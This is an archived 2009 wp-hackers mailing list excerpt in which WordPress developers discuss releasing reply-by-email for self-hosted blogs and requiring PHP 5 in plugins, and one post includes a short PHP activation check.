>> http://en.blog.wordpress.com/2009/04/23/comment-reply-via-email-open-to-all/
>
>
> Not currently. ?Users would need some ability to manage email aliases, pipe
> email to PHP script, etc. ?Not out of the question, just not as easy as
> setting up WP.
>
> --
> Joseph Scott
> joseph at josephscott.org
> http://josephscott.org/
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Matt Freedman
http://mattfreedman.ca/

From lynne.pope at gmail.com  Tue Jul 14 04:01:35 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 14 Jul 2009 16:01:35 +1200
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
Message-ID: <427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>

> On Mon, Jul 13, 2009 at 8:40 AM, Joseph Scott<joseph at josephscott.org>
> wrote:
> >
> > On Jul 13, 2009, at 8:34 AM, Chris Poteet wrote:
> >
> >> Is there a plan to implement this in the self hosted version?
> >>
> >>
> >>
> http://en.blog.wordpress.com/2009/04/23/comment-reply-via-email-open-to-all/
> >
> >
> > Not currently.  Users would need some ability to manage email aliases,
> pipe
> > email to PHP script, etc.  Not out of the question, just not as easy as
> > setting up WP.
>

How about releasing the source code so that those who wish to use it can?
Or, better yet, release as a plugin.

While self-hosted WordPress needs to be as easy to set up as possible, to
cater for the masses, there are a very large number of more advanced users
who already build on core functionality with additional scripting and who
manage their own servers. A plugin for .org and MU would be well-received.

Pretty please?

Lynne

From mikeschinkel at newclarity.net  Tue Jul 14 04:14:10 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 13 Jul 2009 23:14:10 -0500 (CDT)
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
Message-ID: <6381975.2291247544864289.JavaMail.DELL-1405$@Dell-1405>

From: "Lynne Pope" <lynne.pope at gmail.com>
> How about releasing the source code so that those who wish to 
> use it can? Or, better yet, release as a plugin.
> Pretty please?

+1

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

From m at mullenweg.com  Tue Jul 14 06:38:58 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 13 Jul 2009 23:38:58 -0700
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
Message-ID: <4A5C2802.5060403@mullenweg.com>

On 7/13/2009 9:01 PM, Lynne Pope wrote:
> How about releasing the source code so that those who wish to use it can?
> Or, better yet, release as a plugin.

I'm planning on releasing it, but it'll probably be like the video 
server and require a bit of setup to use fully.

I also want to do a way for the WP.com post by email system to post to 
wordpress.org blogs, or any XML-RPC endpoint.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From joost at yoast.com  Tue Jul 14 06:40:34 2009
From: joost at yoast.com (Joost de Valk)
Date: Tue, 14 Jul 2009 08:40:34 +0200
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <4A5C2802.5060403@mullenweg.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
	<4A5C2802.5060403@mullenweg.com>
Message-ID: <4A5C2862.7020802@yoast.com>

Matt Mullenweg wrote:
> On 7/13/2009 9:01 PM, Lynne Pope wrote:
>> How about releasing the source code so that those who wish to use it 
>> can?
>> Or, better yet, release as a plugin. 
>
> I'm planning on releasing it, but it'll probably be like the video 
> server and require a bit of setup to use fully.
>
> I also want to do a way for the WP.com post by email system to post to 
> wordpress.org blogs, or any XML-RPC endpoint. 
The latter sounds like a real fine plan Matt, as the former sounds like 
a pain for the average end user :)

Cheers,
Joost
-- 
*Joost de Valk*
SEO & Web Development (Magento & WordPress)
OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - 
joost at yoast.com <mailto:joost at yoast.com>
T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
W: http://yoast.com/

From frank at bueltge.de  Tue Jul 14 06:50:20 2009
From: frank at bueltge.de (Frank Bueltge)
Date: Tue, 14 Jul 2009 08:50:20 +0200
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <6381975.2291247544864289.JavaMail.DELL-1405$@Dell-1405>
References: <427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com> 
	<6381975.2291247544864289.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <db047a770907132350u275f2564wd02b78c730b5661e@mail.gmail.com>

>> How about releasing the source code so that those who wish to
>> use it can? Or, better yet, release as a plugin.
>> Pretty please?
+1

best regards
Frank

__
Das neue Buch: Das WordPress-Buch, Vom Blog zum Content-Management-System
  ISBN 978-3937514703
  http://wordpress-buch.bueltge.de/das-wordpress-buch/

Das Buch: WordPress - Weblogs einrichten und administrieren, Open Source Press
  ISBN 978-3-937514-33-8
  http://wordpress-buch.bueltge.de/das-buch/

http://bueltge.de : frank at bueltge.de
http://wpengineer.com : frank at wpengineer.com
__
Frank B?ltge
Tel:    +49 36428 122529
Mobil:  +49 170 5322053
E-Mail: f.bueltge at inpsyde.com

Inpsyde GmbH
Mutzer Heide 3
51467 Bergisch Gladbach

Steuernr: 204/5756/0999 Steueridentnr.: DE263849534
Gesch?ftsf?hrender Gesellschafter: Heinz Roh? HRB 65224 Amtsgericht K?ln

http://inpsyde.com
http://pressthis.de



On Tue, Jul 14, 2009 at 6:14 AM, Mike
Schinkel<mikeschinkel at newclarity.net> wrote:
> From: "Lynne Pope" <lynne.pope at gmail.com>
>> How about releasing the source code so that those who wish to
>> use it can? Or, better yet, release as a plugin.
>> Pretty please?
>
> +1
>
> -Mike Schinkel
> Custom Wordpress Plugins
> http://mikeschinkel.com/custom-wordpress-plugins
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From cpoteet at siolon.com  Tue Jul 14 14:33:55 2009
From: cpoteet at siolon.com (Chris)
Date: Tue, 14 Jul 2009 07:33:55 -0700 (PDT)
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <4A5C2802.5060403@mullenweg.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com> 
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com> 
	<4A5C2802.5060403@mullenweg.com>
Message-ID: <89c0a408-9299-4dc2-8665-093008bef5cf@h30g2000vbr.googlegroups.com>

Matt Mullenweg
> I'm planning on releasing it, but it'll probably be like the video
> server and require a bit of setup to use fully.
>
> I also want to do a way for the WP.com post by email system to post to
> wordpress.org blogs, or any XML-RPC endpoint.

Thanks Matt!

From wordpress at tekartist.org  Tue Jul 14 16:08:54 2009
From: wordpress at tekartist.org (Stephane Daury)
Date: Tue, 14 Jul 2009 12:08:54 -0400
Subject: [wp-hackers] If interested: WordCamp Montreal 2009 High and
	Complete Lack of Lows
Message-ID: <93E18C50-1FF7-42EE-BB6B-0CCEDD09E4F8@tekartist.org>


Thought some of you might be interested.

http://tekartist.org/blog/2009/07/14/wordcamp-montreal-2009-high-and-complete-lack-of-lows/

Maybe more of the wp-hackers crew can make it next year. It's not  
WordCamp SF, but it was a blast. :)

Cheers,

Stephane Daury


From wordpress at tekartist.org  Tue Jul 14 16:16:55 2009
From: wordpress at tekartist.org (Stephane Daury)
Date: Tue, 14 Jul 2009 12:16:55 -0400
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <4A5C2802.5060403@mullenweg.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
	<4A5C2802.5060403@mullenweg.com>
Message-ID: <81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>


On Jul 14, 2009, at 2:38, Matt Mullenweg wrote:

> On 7/13/2009 9:01 PM, Lynne Pope wrote:
>> How about releasing the source code so that those who wish to use  
>> it can?
>> Or, better yet, release as a plugin.
>
> I'm planning on releasing it, but it'll probably be like the video  
> server and require a bit of setup to use fully.
>
> I also want to do a way for the WP.com post by email system to post  
> to wordpress.org blogs, or any XML-RPC endpoint.

I like the sound of that! :D

Stephane daury

From latz at elektroelch.de  Tue Jul 14 17:31:26 2009
From: latz at elektroelch.de (=?ISO-8859-1?Q?Lutz_Schr=F6er?=)
Date: Tue, 14 Jul 2009 19:31:26 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
Message-ID: <4A5CC0EE.6060102@elektroelch.de>

I've decided to use exclusively PHP5 in my new plugin version since it 
was much easier to code it using the PHP5 features. Unfortunately many 
users seem to have no access to webspace with PHP5 (five years after 
PHP5 was released!).

I have prevented people from updating through the backend 
programmatically but those who are downloading the plugin from 
wordpress.org and installing it manually often do not read the 
readme.txt and wonder about a "Parse error: syntax error, unexpected 
T_CLASS".

How about adding a "Requires PHP version x.xx" tag to the readme.txt 
that will be displayed on the extend pages? And maybe the backend could 
evaluate this tag, too, and disable the update if the installed version 
does not fit.


... and even if this topic has been discussed a thousand times: Let's 
drop the PHP4 support!

Latz


From joseph at josephscott.org  Tue Jul 14 17:46:10 2009
From: joseph at josephscott.org (Joseph Scott)
Date: Tue, 14 Jul 2009 11:46:10 -0600
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>
Message-ID: <96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>


On Jul 14, 2009, at 10:16 AM, Stephane Daury wrote:

> On Jul 14, 2009, at 2:38, Matt Mullenweg wrote:
>
>> On 7/13/2009 9:01 PM, Lynne Pope wrote:
>>> How about releasing the source code so that those who wish to use  
>>> it can?
>>> Or, better yet, release as a plugin.


With some work (mostly making sure there's no WordPress.com specific  
codisms) it could be pounded into a plugin.


>>
>> I'm planning on releasing it, but it'll probably be like the video  
>> server and require a bit of setup to use fully.
>>
>> I also want to do a way for the WP.com post by email system to post  
>> to wordpress.org blogs, or any XML-RPC endpoint.
>
> I like the sound of that! :D



The second method of using WordPress.com as a hub so that any  
WordPress.org blog could use these features as well going to be much  
more popular.  That said I'll look at the code and see what needs to  
be done to wrap it into a plugin.

--
Joseph Scott
joseph at josephscott.org
http://josephscott.org/





From aaron at xavisys.com  Tue Jul 14 17:54:54 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Tue, 14 Jul 2009 10:54:54 -0700
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5CC0EE.6060102@elektroelch.de>
References: <4A5CC0EE.6060102@elektroelch.de>
Message-ID: <4A5CC66E.7030005@xavisys.com>

Most of my plugins require PHP5+ 
<http://wordpress.org/extend/plugins/profile/aaroncampbell>. Notice that 
I add "Requires PHP5" right into the main plugin description, which 
helped a lot. Also, make some sort of canned response for the questions 
you get similar to this:

The plugin requires PHP 5 and you?re running PHP 4. Most hosts offer 
PHP5 but you probably have to enable it in your control panel, through 
.htaccess, or by asking them.

As for switching to PHP 5, there's been rumors of switching in 3.0, but 
I'm sure that'll be based on stats collected. I think Matt said that 
they already have 80+% of WordPress installs using PHP5+, but he didn't 
know the exact number. Either way, it's definitely been discussed to 
death on this list.

Lutz Schr?er wrote:
> I've decided to use exclusively PHP5 in my new plugin version since it 
> was much easier to code it using the PHP5 features. Unfortunately many 
> users seem to have no access to webspace with PHP5 (five years after 
> PHP5 was released!).
>
> I have prevented people from updating through the backend 
> programmatically but those who are downloading the plugin from 
> wordpress.org and installing it manually often do not read the 
> readme.txt and wonder about a "Parse error: syntax error, unexpected 
> T_CLASS".
>
> How about adding a "Requires PHP version x.xx" tag to the readme.txt 
> that will be displayed on the extend pages? And maybe the backend 
> could evaluate this tag, too, and disable the update if the installed 
> version does not fit.
>
>
> ... and even if this topic has been discussed a thousand times: Let's 
> drop the PHP4 support!
>
> Latz


From otto at ottodestruct.com  Tue Jul 14 20:41:56 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 14 Jul 2009 15:41:56 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5CC0EE.6060102@elektroelch.de>
References: <4A5CC0EE.6060102@elektroelch.de>
Message-ID: <161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>

Don't rely on users, they're invariably idiots. ;)

Make your plugin smarter instead.

/**
 * plugin_activation_check()
 *
 * Replace "plugin" with the name of your plugin
 */
function plugin_activation_check(){
	if (version_compare(PHP_VERSION, '5.0.0', '<')) {
		deactivate_plugins(basename(__FILE__)); // Deactivate ourself
		wp_die("Sorry, but you can't run this plugin, it requires PHP 5 or higher.");
	}
}
register_activation_hook(__FILE__, 'plugin_activation_check');



-Otto



On Tue, Jul 14, 2009 at 12:31 PM, Lutz Schr?er<latz at elektroelch.de> wrote:
> I've decided to use exclusively PHP5 in my new plugin version since it was
> much easier to code it using the PHP5 features. Unfortunately many users
> seem to have no access to webspace with PHP5 (five years after PHP5 was
> released!).
>
> I have prevented people from updating through the backend programmatically
> but those who are downloading the plugin from wordpress.org and installing
> it manually often do not read the readme.txt and wonder about a "Parse
> error: syntax error, unexpected T_CLASS".
>
> How about adding a "Requires PHP version x.xx" tag to the readme.txt that
> will be displayed on the extend pages? And maybe the backend could evaluate
> this tag, too, and disable the update if the installed version does not fit.
>
>
> ... and even if this topic has been discussed a thousand times: Let's drop
> the PHP4 support!
>
> Latz
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From joost at yoast.com  Tue Jul 14 20:43:49 2009
From: joost at yoast.com (Joost de Valk)
Date: Tue, 14 Jul 2009 22:43:49 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
Message-ID: <4A5CEE05.4090204@yoast.com>

Is there a page somewhere on a "big, authoritative" website, that 
explains why PHP5 is cool and required etc. that people can link to?

Best,
Joost

Otto wrote:
> Don't rely on users, they're invariably idiots. ;)
>
> Make your plugin smarter instead.
>
> /**
>   * plugin_activation_check()
>   *
>   * Replace "plugin" with the name of your plugin
>   */
> function plugin_activation_check(){
> 	if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> 		deactivate_plugins(basename(__FILE__)); // Deactivate ourself
> 		wp_die("Sorry, but you can't run this plugin, it requires PHP 5 or higher.");
> 	}
> }
> register_activation_hook(__FILE__, 'plugin_activation_check');
>
>
>
> -Otto
>
>
>
> On Tue, Jul 14, 2009 at 12:31 PM, Lutz Schr?er<latz at elektroelch.de>  wrote:
>    
>> I've decided to use exclusively PHP5 in my new plugin version since it was
>> much easier to code it using the PHP5 features. Unfortunately many users
>> seem to have no access to webspace with PHP5 (five years after PHP5 was
>> released!).
>>
>> I have prevented people from updating through the backend programmatically
>> but those who are downloading the plugin from wordpress.org and installing
>> it manually often do not read the readme.txt and wonder about a "Parse
>> error: syntax error, unexpected T_CLASS".
>>
>> How about adding a "Requires PHP version x.xx" tag to the readme.txt that
>> will be displayed on the extend pages? And maybe the backend could evaluate
>> this tag, too, and disable the update if the installed version does not fit.
>>
>>
>> ... and even if this topic has been discussed a thousand times: Let's drop
>> the PHP4 support!
>>
>> Latz
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>      
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

-- 
*Joost de Valk*
SEO & Web Development (Magento & WordPress)
OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - 
joost at yoast.com <mailto:joost at yoast.com>
T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
W: http://yoast.com/

From t.nash at venture-skills.co.uk  Tue Jul 14 20:45:51 2009
From: t.nash at venture-skills.co.uk (Tim Nash)
Date: Tue, 14 Jul 2009 21:45:51 +0100
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5CEE05.4090204@yoast.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<4A5CEE05.4090204@yoast.com>
Message-ID: <234e4ea40907141345k163d821r6977fbd4b6c0010d@mail.gmail.com>

http://gophp5.org/

Cheers
Tim

2009/7/14 Joost de Valk <joost at yoast.com>:
> Is there a page somewhere on a "big, authoritative" website, that explains
> why PHP5 is cool and required etc. that people can link to?
>
> Best,
> Joost
>
> Otto wrote:
>>
>> Don't rely on users, they're invariably idiots. ;)
>>
>> Make your plugin smarter instead.
>>
>> /**
>> ?* plugin_activation_check()
>> ?*
>> ?* Replace "plugin" with the name of your plugin
>> ?*/
>> function plugin_activation_check(){
>> ? ? ? ?if (version_compare(PHP_VERSION, '5.0.0', '<')) {
>> ? ? ? ? ? ? ? ?deactivate_plugins(basename(__FILE__)); // Deactivate
>> ourself
>> ? ? ? ? ? ? ? ?wp_die("Sorry, but you can't run this plugin, it requires
>> PHP 5 or higher.");
>> ? ? ? ?}
>> }
>> register_activation_hook(__FILE__, 'plugin_activation_check');
>>
>>
>>
>> -Otto
>>
>>
>>
>> On Tue, Jul 14, 2009 at 12:31 PM, Lutz Schr?er<latz at elektroelch.de>
>> ?wrote:
>>
>>>
>>> I've decided to use exclusively PHP5 in my new plugin version since it
>>> was
>>> much easier to code it using the PHP5 features. Unfortunately many users
>>> seem to have no access to webspace with PHP5 (five years after PHP5 was
>>> released!).
>>>
>>> I have prevented people from updating through the backend
>>> programmatically
>>> but those who are downloading the plugin from wordpress.org and
>>> installing
>>> it manually often do not read the readme.txt and wonder about a "Parse
>>> error: syntax error, unexpected T_CLASS".
>>>
>>> How about adding a "Requires PHP version x.xx" tag to the readme.txt that
>>> will be displayed on the extend pages? And maybe the backend could
>>> evaluate
>>> this tag, too, and disable the update if the installed version does not
>>> fit.
>>>
>>>
>>> ... and even if this topic has been discussed a thousand times: Let's
>>> drop
>>> the PHP4 support!
>>>
>>> Latz
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
> --
> *Joost de Valk*
> SEO & Web Development (Magento & WordPress)
> OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
> E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - joost at yoast.com
> <mailto:joost at yoast.com>
> T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
> W: http://yoast.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
-- 
Tim Nash - www.timnash.co.uk

Wordpress Plugin Specialists - www.newmedias.co.uk

Venture Skills and Cambridge New Media Services are a non Limited
Partnership based in the UK
Tim Nash SEO Consultant & Venture Skills non limited Partnership are
separate entities. For enquires regarding Venture Skills please
contact support at venture-skills.co.uk
Venture Skills - Fairview, DN22 8PY UK

From otto at ottodestruct.com  Tue Jul 14 20:46:57 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 14 Jul 2009 15:46:57 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5CEE05.4090204@yoast.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com> 
	<4A5CEE05.4090204@yoast.com>
Message-ID: <161617690907141346k6e88e4e7v46a46355cc8d822b@mail.gmail.com>

PHP 5 tends to be a lot easier and a lot faster, is all.

There's a lot of really handy functions in newer PHP versions and
writing them yourself in PHP 4 is a pain in the arse. And then some
things are simply impossible to do in PHP 4 (proper timezone support,
for example).

Also, PHP 5.1 is about 4 times faster than PHP 4, on average.


-Otto



On Tue, Jul 14, 2009 at 3:43 PM, Joost de Valk<joost at yoast.com> wrote:
> Is there a page somewhere on a "big, authoritative" website, that explains
> why PHP5 is cool and required etc. that people can link to?
>
> Best,
> Joost
>

From joost at yoast.com  Tue Jul 14 20:47:22 2009
From: joost at yoast.com (Joost de Valk)
Date: Tue, 14 Jul 2009 22:47:22 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <234e4ea40907141345k163d821r6977fbd4b6c0010d@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>	<4A5CEE05.4090204@yoast.com>
	<234e4ea40907141345k163d821r6977fbd4b6c0010d@mail.gmail.com>
Message-ID: <4A5CEEDA.3090506@yoast.com>

thanks!

Tim Nash wrote:
> http://gophp5.org/
>
> Cheers
> Tim
>
> 2009/7/14 Joost de Valk<joost at yoast.com>:
>    
>> Is there a page somewhere on a "big, authoritative" website, that explains
>> why PHP5 is cool and required etc. that people can link to?
>>
>> Best,
>> Joost
>>
>> Otto wrote:
>>      
>>> Don't rely on users, they're invariably idiots. ;)
>>>
>>> Make your plugin smarter instead.
>>>
>>> /**
>>>   * plugin_activation_check()
>>>   *
>>>   * Replace "plugin" with the name of your plugin
>>>   */
>>> function plugin_activation_check(){
>>>         if (version_compare(PHP_VERSION, '5.0.0', '<')) {
>>>                 deactivate_plugins(basename(__FILE__)); // Deactivate
>>> ourself
>>>                 wp_die("Sorry, but you can't run this plugin, it requires
>>> PHP 5 or higher.");
>>>         }
>>> }
>>> register_activation_hook(__FILE__, 'plugin_activation_check');
>>>
>>>
>>>
>>> -Otto
>>>
>>>
>>>
>>> On Tue, Jul 14, 2009 at 12:31 PM, Lutz Schr?er<latz at elektroelch.de>
>>>   wrote:
>>>
>>>        
>>>> I've decided to use exclusively PHP5 in my new plugin version since it
>>>> was
>>>> much easier to code it using the PHP5 features. Unfortunately many users
>>>> seem to have no access to webspace with PHP5 (five years after PHP5 was
>>>> released!).
>>>>
>>>> I have prevented people from updating through the backend
>>>> programmatically
>>>> but those who are downloading the plugin from wordpress.org and
>>>> installing
>>>> it manually often do not read the readme.txt and wonder about a "Parse
>>>> error: syntax error, unexpected T_CLASS".
>>>>
>>>> How about adding a "Requires PHP version x.xx" tag to the readme.txt that
>>>> will be displayed on the extend pages? And maybe the backend could
>>>> evaluate
>>>> this tag, too, and disable the update if the installed version does not
>>>> fit.
>>>>
>>>>
>>>> ... and even if this topic has been discussed a thousand times: Let's
>>>> drop
>>>> the PHP4 support!
>>>>
>>>> Latz
>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>>
>>>>          
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>        
>> --
>> *Joost de Valk*
>> SEO&  Web Development (Magento&  WordPress)
>> OrangeValley<http://www.orangevalley.nl>  &  Yoast<http://yoast.com>
>> E: joost at orangevalley.nl<mailto:joost at orangevalley.nl>  - joost at yoast.com
>> <mailto:joost at yoast.com>
>> T: +31624555808 | @yoast<http://twitter.com/yoast>  on Twitter
>> W: http://yoast.com/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>      
>
>
>
>    

-- 
*Joost de Valk*
SEO & Web Development (Magento & WordPress)
OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - 
joost at yoast.com <mailto:joost at yoast.com>
T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
W: http://yoast.com/

From joost at yoast.com  Tue Jul 14 20:48:18 2009
From: joost at yoast.com (Joost de Valk)
Date: Tue, 14 Jul 2009 22:48:18 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907141346k6e88e4e7v46a46355cc8d822b@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<4A5CEE05.4090204@yoast.com>
	<161617690907141346k6e88e4e7v46a46355cc8d822b@mail.gmail.com>
Message-ID: <4A5CEF12.2050806@yoast.com>

I *know* but am just to lazy to write it up myself :)

Otto wrote:
> PHP 5 tends to be a lot easier and a lot faster, is all.
>
> There's a lot of really handy functions in newer PHP versions and
> writing them yourself in PHP 4 is a pain in the arse. And then some
> things are simply impossible to do in PHP 4 (proper timezone support,
> for example).
>
> Also, PHP 5.1 is about 4 times faster than PHP 4, on average.
>
>
> -Otto
>
>
>
> On Tue, Jul 14, 2009 at 3:43 PM, Joost de Valk<joost at yoast.com>  wrote:
>    
>> Is there a page somewhere on a "big, authoritative" website, that explains
>> why PHP5 is cool and required etc. that people can link to?
>>
>> Best,
>> Joost
>>
>>      
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

-- 
*Joost de Valk*
SEO & Web Development (Magento & WordPress)
OrangeValley <http://www.orangevalley.nl> & Yoast <http://yoast.com>
E: joost at orangevalley.nl <mailto:joost at orangevalley.nl> - 
joost at yoast.com <mailto:joost at yoast.com>
T: +31624555808 | @yoast <http://twitter.com/yoast> on Twitter
W: http://yoast.com/

From otto at ottodestruct.com  Tue Jul 14 20:49:54 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 14 Jul 2009 15:49:54 -0500
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com> 
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com> 
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org> 
	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
Message-ID: <161617690907141349k2be83858r4727e7400f88deb0@mail.gmail.com>

On Tue, Jul 14, 2009 at 12:46 PM, Joseph Scott<joseph at josephscott.org> wrote:
> The second method of using WordPress.com as a hub so that any WordPress.org
> blog could use these features as well going to be much more popular.

Something along the lines of Stats, where the blog is tied to a wp.com
account using the API key?

-Otto

From lynne.pope at gmail.com  Tue Jul 14 23:37:23 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Wed, 15 Jul 2009 11:37:23 +1200
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com> 
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com> 
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org> 
	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
Message-ID: <427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>

2009/7/15 Joseph Scott <joseph at josephscott.org>

>
